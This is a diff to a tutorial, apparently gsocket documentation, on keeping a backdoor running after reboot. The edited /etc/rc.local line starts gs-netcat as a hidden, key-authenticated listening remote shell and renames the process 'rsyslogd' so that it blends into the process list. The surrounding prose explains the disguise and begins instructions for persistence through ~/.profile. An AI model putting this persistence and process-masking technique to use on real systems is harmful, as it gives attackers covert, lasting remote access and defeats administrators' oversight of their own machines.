@@ -192,11 +192,11 @@ Combine what you have learned so far and make your backdoor restart after reboot
 $ cat /etc/rc.local
 #! /bin/sh -e
 
-GSOCKET_ARGS="-k /root/.gs_id_sec.txt -liqD" TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd /root; exec -a rsyslogd /usr/local/bin/gs-netcat"
+GSOCKET_ARGS="-k /root/.gs_id_sec.txt -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"
 
 exit 0
 ```
-The environment is not fully set up the way we like it during bootup. Thus we set some values to make the backdoor more enjoyable (optionally): *TERM=xterm-256color* and *SHELL=/binb/bash*. Next the startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we have */bin/sh* start */bin/bash* which in turn does the *exec -a* trick to start *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list.Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.
+During bootup the environment variables are not all set. Thus we set some values to make the backdoor more enjoyable (optionally): *TERM=xterm-256color* and *SHELL=/binb/bash* and *HOME=/root*. Next the startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list.Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.
 
 Starting when the user logs in (and only once) can be done by adding this line to the user's *~/.profile* file:
 ```
